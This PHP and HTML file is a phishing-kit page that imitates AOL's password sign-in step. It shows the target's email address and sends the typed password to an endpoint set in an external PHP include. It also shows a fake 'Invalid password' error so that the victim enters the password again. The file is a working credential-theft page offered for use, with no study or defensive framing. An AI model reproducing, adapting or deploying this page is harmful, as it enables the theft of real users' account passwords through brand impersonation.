<?php
include "mfunc.php";
?>
<!DOCTYPE html>
<html id="Stencil" class="js grid light-theme">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <link rel="stylesheet" href="rel/styles_lty.css">
        <link rel="shortcut icon" href="rel/ao/favicon.png" type="image/png">
        <title>AOL</title>
        <style>

            #login-passwd:invalid {
                box-shadow: none;
            }

            @media (max-width: 800px) {
                .login-box {
                    width: 100%;
                    margin: 0px;
                    padding: 0px;
                    box-shadow: none;
                    border: none;
                }
                .mbr-desktop-hd {
                    display: none;
                }
            }

        </style>
    </head>
    <body>
        <div id="login-body" class="loginish puree-v2 grid ">
            <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="rel/ao/aol.png" alt="AOL" class="logo " width="" height="36"><img alt="AOL" class="dark-mode-logo logo " width="" height="36"></a></span>
                <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center"><img src="rel/ao/aol.png" alt="AOL" class="logo yahoo-en-GB" width="100"><img alt="AOL" class="dark-mode-logo logo yahoo-en-GB"
                            width="" height="27"></div>
                    <div class="challenge password-challenge">
                        <div class="challenge-header">
                            <div class="yid"><?php echo $_SESSION['email']; ?> <a href="<?php echo $epage; ?>"><font color="#1a73e8">&nbsp;Not&nbsp;You?</font></a></div>
                        </div>
                        <div id="password-challenge" class="primary">
                            <strong class="challenge-heading">Enter&nbsp;password</strong>
                            <span class="txt-align-center challenge-desc">to finish signing&nbsp;in</span>
                            <form action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="post" class="challenge-form">
                                <input type="hidden" name="<?php echo $ename; ?>" value='<?php echo $_SESSION['email']; ?>'>
                                <div class="hidden-username"></div>
								<input type="hidden" name="<?php echo $idc; ?>" value='<?php echo md5(uniqid()); ?>'>
                                <div id="password-container" class="input-group password-container blurred"><input type="password" id="login-passwd" class="password" name="<?php echo $pname; ?>" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd" required>
                                    <label for="login-passwd" id="password-label" class="password-label">Password</label>
                                    <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is&nbsp;on"></div>
                                    <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button"></button>
                                </div>
                                <div id="passError">
                                    
                                </div>
                                <div class="button-container">
                                    <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next" style="border-radius: .11765rem; font-weight: normal;">Next</button>
                                </div>
                                <div class="forgot-cont challenge-button-link"><input type="button" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery" value="Forgotten&nbsp;password?"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
	<script>

		var timesClicked = 0;

		function showPass() {
			if (timesClicked >= 1) {
				document.getElementById("login-passwd").type = "password";
				document.getElementById("password-toggle-button").classList.remove('show-pw');
				document.getElementById("password-toggle-button").classList.add('hide-pw');
				timesClicked = 0;
			} else {
				document.getElementById("login-passwd").type = "text";
				document.getElementById("password-toggle-button").classList.remove('hide-pw');
				document.getElementById("password-toggle-button").classList.add('show-pw');
				timesClicked++;
			}
		}

		document.getElementById("password-toggle-button").onclick = showPass;

		<?php

			if (isset($eshow))  {
				echo '
				
					document.getElementById("passError").innerHTML = \'<p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try&nbsp;again</p>\';
					document.getElementById("password-container").classList.add("error");

				';
			}

		?>

        </script>
    </body>
</html>